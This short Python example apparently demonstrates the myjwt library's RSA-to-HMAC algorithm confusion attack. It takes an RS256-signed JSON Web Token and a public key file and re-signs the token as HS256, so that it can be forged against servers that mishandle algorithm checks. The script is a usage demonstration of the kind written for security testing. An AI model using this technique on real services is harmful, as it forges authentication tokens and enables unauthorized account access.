from myjwt.vulnerabilities import confusion_rsa_hmac

jwt = (
    "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJsb2dpbiI6ImEifQ.Fjziy6GSQpP9tQRyko5APZjdymkQ8EJGOa"
    "-A2JQ6xcAVucXRhZbdBbAM2DG8io_brP_ROAqYaNlvRVsztXoPHFz_e7D2K0q6f02RXeRwZJGOhy0K"
    "-Oj9Z1UmFJWqVpAAafN75w7OKoSRh6BtQfH8XDleqwpVoywCuWFdYrSbqBoVskRQkp8H-HUC5XmN5om4-NdiQkiKa7OFQ6Hoklclz9_WD5rc"
    "-HWJp3rJW4EIHzOPfs1GuDuhtIRu0uuRYp4vvzLZcVm0BhlK9e_fmFcbsTz3MwVHIeFEIx2NjQdhE"
    "-CefQ4tNg6Rr6OtgGExToUfD0i0mAoAhTcvmoyO6c2paQ"
)
# Header: {"typ": "JWT", "alg": "RS256"}
# Payload: {"login": "a"}
file = "public.pem"
# file is a path file of your public key
jwt = confusion_rsa_hmac(jwt, file)
# same jwt will be print except header alg(set to HS256) and signature
print(jwt)
